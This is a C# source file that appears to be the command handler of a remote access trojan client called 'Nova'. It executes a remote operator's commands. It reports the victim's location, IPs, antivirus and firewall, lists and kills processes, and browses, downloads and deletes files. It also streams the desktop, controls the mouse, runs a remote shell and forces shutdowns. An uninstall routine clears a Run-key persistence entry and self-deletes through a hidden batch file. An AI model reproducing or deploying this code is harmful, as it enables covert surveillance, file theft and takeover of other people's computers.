using Nova.Common.Helper;
using Nova.Packets;
using Nova.Packets.ClientPackets;
using Nova.Packets.ServerPackets;
using Nova.RemoteShell;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Nova.Commands
{
    class CHandler
    {
        [DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteFile(string name);
        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int x, int y);
        [DllImport("user32.dll")]
        private static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
        private const int MOUSEEVENTF_LEFTUP = 0x04;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;

        // 新增：泛型执行方法
        public static void Execute<T>(T packet, Client client) where T : IPacket
        {
            client.Send<T>(packet);
        }

        private static Shell shell = null;
        public static void HandleInitializeCommand(InitializeCommand command, global::Nova.Client client)
        {
            ClientInfo.InitializeGeoIp();
            Execute(new Initialize(
                Settings.VERSION,
                ClientInfo.OperatingSystem,
                ClientInfo.AccountType,
                ClientInfo.Country,
                ClientInfo.CountryCode,
                ClientInfo.Region,
                ClientInfo.City,
                ClientInfo.ImageIndex), client);
        }

        public static void HandleGetProcesses(GetProcesses command, Client client)
        {
            Process[] pList = Process.GetProcesses();
            string[] processes = new string[pList.Length];
            int[] ids = new int[pList.Length];
            string[] titles = new string[pList.Length];

            int i = 0;
            foreach (Process p in pList)
            {
                processes[i] = p.ProcessName + ".exe";
                ids[i] = p.Id;
                titles[i] = p.MainWindowTitle;
                i++;
            }

            Execute(new GetProcessesResponse(processes, ids, titles),client);
        }
        public static void HandleDrives(Drives command, Nova.Client client)
        {
            Execute(new DrivesResponse(System.Environment.GetLogicalDrives()),client);
        }
        public static void HandleDirectory(Folder command, Nova.Client client)
        {
            try
            {
                DirectoryInfo dicInfo = new System.IO.DirectoryInfo(command.RemotePath);

                FileInfo[] iFiles = dicInfo.GetFiles();
                DirectoryInfo[] iFolders = dicInfo.GetDirectories();

                string[] files = new string[iFiles.Length];
                long[] filessize = new long[iFiles.Length];
                string[] folders = new string[iFolders.Length];

                int i = 0;
                foreach (FileInfo file in iFiles)
                {
                    files[i] = file.Name;
                    filessize[i] = file.Length;
                    i++;
                }
                if (files.Length == 0)
                {
                    files = new string[] { "$$$EMPTY$$$$" };
                    filessize = new long[] { 0 };
                }

                i = 0;
                foreach (DirectoryInfo folder in iFolders)
                {
                    folders[i] = folder.Name;
                    i++;
                }
                if (folders.Length == 0)
                    folders = new string[] { "$$$EMPTY$$$$" };

                Execute(new DirectoryResponse(files, folders, filessize),client);
            }
            catch
            {
                Execute(new DirectoryResponse(new string[] { "$$$EMPTY$$$$" }, new string[] { "$$$EMPTY$$$$" }, new long[] { 0 }),client);
            }
        }

        public static void HandleGetSystemInfo(GetSystemInfo packet, Client client)
        {
            try
            {
                string[] infoCollection = new string[20];
                infoCollection[0] = "Processor (CPU)";
                infoCollection[1] = ClientInfo.GetCpu();
                infoCollection[2] = "Memory (RAM)";
                infoCollection[3] = string.Format("{0} MB", ClientInfo.GetRam());
                infoCollection[4] = "Video Card (GPU)";
                infoCollection[5] = ClientInfo.GetGpu();
                infoCollection[6] = "Username";
                infoCollection[7] = ClientInfo.GetUsername();
                infoCollection[8] = "PC Name";
                infoCollection[9] = ClientInfo.GetPcName();
                infoCollection[10] = "Uptime";
                infoCollection[11] = ClientInfo.GetUptime();
                infoCollection[12] = "LAN IP Address";
                infoCollection[13] = ClientInfo.GetLanIp();
                infoCollection[14] = "WAN IP Address";
                infoCollection[15] = ClientInfo.WANIP;
                infoCollection[16] = "Antivirus";
                infoCollection[17] = ClientInfo.GetAntivirus();
                infoCollection[18] = "Firewall";
                infoCollection[19] = ClientInfo.GetFirewall();
                Execute(new GetSystemInfoResponse(infoCollection),client);
            }
            catch
            { }
        }

        public static void HandleKillProcess(KillProcess command, Client client)
        {
            try
            {
                Process.GetProcessById(command.PID).Kill();
            }
            catch
            { }

            HandleGetProcesses(new GetProcesses(), client);
        }

        public static void HandleStartProcess(StartProcess command, Client client)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.UseShellExecute = true;
            startInfo.FileName = command.Processname;
            Process.Start(startInfo);

            HandleGetProcesses(new GetProcesses(), client);
        }

        public static void HandleDownloadFile(DownloadFile command, Client client)
        {
            try
            {
                byte[] bytes = File.ReadAllBytes(command.RemotePath);
                Execute(new DownloadFileResponse(Path.GetFileName(command.RemotePath), bytes, command.ID),client);
            }
            catch (Exception ex)
            {
                SLogger.Error(ex.ToString());
            }
        }

        public static void HandleRename(Rename command, Client client)
        {
            try
            {
                if (command.IsDir)
                    System.IO.Directory.Move(command.Path, command.NewPath);
                else
                    File.Move(command.Path, command.NewPath);

                HandleDirectory(new Folder(Path.GetDirectoryName(command.NewPath)), client);
            }
            catch
            { }
        }

        public static void HandleDelete(Delete command, Client client)
        {
            try
            {
                if (command.IsDir)
                    System.IO.Directory.Delete(command.Path, true);
                else
                    File.Delete(command.Path);

                HandleDirectory(new Folder(Path.GetDirectoryName(command.Path)), client);
            }
            catch
            { }
        }

        public static void HandleAction(PowerOptions command, Nova.Client client)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                switch (command.Mode)
                {
                    case 0:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/s /t 0"; // shutdown
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case 1:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/r /t 0"; // restart
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case 2:
                        Application.SetSuspendState(PowerState.Suspend, true, true); // standby
                        break;
                }
            }
            catch
            {
                Execute(new Status("Action failed!"),client);
            }
        }

        public static void HandleMonitors(Monitors packet, Client client)
        {
            Execute(new MonitorsResponse(Screen.AllScreens.Length),client);
        }

        public static void HandleMouseClick(MouseClick command, Client client)
        {
            if (command.LeftClick)
            {
                SetCursorPos(command.X, command.Y);
                mouse_event(MOUSEEVENTF_LEFTDOWN, command.X, command.Y, 0, 0);
                mouse_event(MOUSEEVENTF_LEFTUP, command.X, command.Y, 0, 0);
                if (command.DoubleClick)
                {
                    mouse_event(MOUSEEVENTF_LEFTDOWN, command.X, command.Y, 0, 0);
                    mouse_event(MOUSEEVENTF_LEFTUP, command.X, command.Y, 0, 0);
                }
            }
            else
            {
                SetCursorPos(command.X, command.Y);
                mouse_event(MOUSEEVENTF_RIGHTDOWN, command.X, command.Y, 0, 0);
                mouse_event(MOUSEEVENTF_RIGHTUP, command.X, command.Y, 0, 0);
                if (command.DoubleClick)
                {
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, command.X, command.Y, 0, 0);
                    mouse_event(MOUSEEVENTF_RIGHTUP, command.X, command.Y, 0, 0);
                }
            }
        }

        private static DateTime _lastDesktopTime = DateTime.MinValue;
        private static byte[] _lastFrame = null;
        public static void HandleRemoteDesktop(Desktop command, Client client)
        {
            // 10 FPS 限制
            if ((DateTime.Now - _lastDesktopTime).TotalMilliseconds < 200)
                return;
            _lastDesktopTime = DateTime.Now;
            Rectangle bounds = Screen.AllScreens[command.Number].Bounds;
            bounds.Width = ClientInfo.physicalWidth;
            bounds.Height = ClientInfo.physicalHeight;
            using (var bmp = HelpMe.GetDesktop(command.Mode, command.Number, bounds))
            {
                if (bmp == null) return;

                // 转成 JPEG
                byte[] currentFrame = HelpMe.CImgToByte(bmp, ImageFormat.Jpeg);

                // 检查是否和上一帧相同
                if (_lastFrame != null && _lastFrame.SequenceEqual(currentFrame))
                    return;  // 画面没变，不发送

                // 发送
                Execute(new DesktopResponse(currentFrame),client);

                // 缓存当前帧
                _lastFrame = currentFrame;
            }
        }

        public static void HandleUninstall(Uninstall packet, Client client)
        {
            Execute(new Status("Uninstalling... bye ;("),client);

            if (Settings.STARTUP)
            {
                if (ClientInfo.AccountType == "Admin")
                {
                    try
                    {
                        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        if (key != null)
                        {
                            key.DeleteValue(Settings.STARTUPKEY, true);
                            key.Close();
                        }
                    }
                    catch
                    {
                        // try deleting from Registry.CurrentUser
                        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        if (key != null)
                        {
                            key.DeleteValue(Settings.STARTUPKEY, true);
                            key.Close();
                        }
                    }
                }
                else
                {
                    try
                    {
                        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        if (key != null)
                        {
                            key.DeleteValue(Settings.STARTUPKEY, true);
                            key.Close();
                        }
                    }
                    catch
                    { }
                }
            }
            string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), HelpMe.GetRandomFilename(12, ".bat"));
            string uninstallBatch =
                    "@echo off" + "\n" +
                    "echo DONT CLOSE THIS WINDOW!" + "\n" +
                    "ping -n 15 localhost > nul" + "\n" +
                    "del " + "\"" + ClientInfo.MyPath + "\"" + "\n" +
                    "del " + "\"" + filename + "\"";

            File.WriteAllText(filename, uninstallBatch);
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = true;
            startInfo.FileName = filename;
            Process.Start(startInfo);

            ClientInfo.Disconnect = true;
            //卸载完成
            client.Disconnect();
        }

        public static void HandleShellCommand(ShellCommand command, Client client)
        {
            if (shell == null)
                shell = new Shell();

            string input = command.Command;

            if (input == "exit")
                CloseShell();
            else
                shell.ExecuteCommand(input);
        }

        public static void CloseShell()
        {
            if (shell != null)
            {
                shell.CloseSession();
                shell = null;
            }
        }
    }
}
